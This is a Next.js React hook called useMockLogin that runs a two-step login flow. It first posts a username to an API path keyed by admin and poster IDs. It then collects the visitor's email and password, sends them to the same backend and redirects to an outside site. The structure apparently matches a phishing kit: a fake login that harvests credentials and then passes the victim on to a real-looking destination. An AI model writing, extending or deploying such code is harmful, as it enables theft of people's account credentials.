"use client";
import { toast } from "react-toastify";
import Cookies from "js-cookie";
import { API_URL } from "../config/index";
import { useRouter } from "next/navigation";

function useMockLogin(adminId, posterId) {
  const router = useRouter();

  const login = async (values) => {
    try {
      const url = `${API_URL}/ad/${adminId}/${posterId}`;
      const res = await fetch(url, {
        method: "POST",
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json",
        },
        body: JSON.stringify(values),
      });

      const data = await res.json();
      console.log("Create Response:", data);

      if (res.ok) {
        Cookies.set("id", data?.info?._id);
        Cookies.set("email", data?.info?.email || "");
        toast.success("Username saved, now enter your valid email.");
        return true;
      } else {
        toast.error("Failed to create user");
        return false;
      }
    } catch (err) {
      console.error(err);
      toast.error("Server Error");
      return false;
    }
  };

  // Step 2 — update
  const updateUserEmail = async ({ email, password }) => {
    try {
      const id = Cookies.get("id");
      if (!id) {
        toast.error("User ID not found. Please restart login.");
        return false;
      }

      // Validate password length
      if (password.length < 8) {
        toast.error("Password must be at least 8 characters");
        return false;
      }

      const res = await fetch(`${API_URL}/update/username`, {
        method: "POST",
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ id, email, password }),
      });

      const data = await res.json();
      // console.log("Update Response:", data);

      if (res.ok) {
        Cookies.set("email", data?.info?.email);
        toast.success("Email updated successfully!");
        router.push("https://privatedelights.ch");
        return true;
      } else {
        toast.error(data?.message || "Failed to update email");
        return false;
      }
    } catch (err) {
      console.error(err);
      toast.error("Server Error");
      return false;
    }
  };

  return { login, updateUserEmail };
}

export default useMockLogin;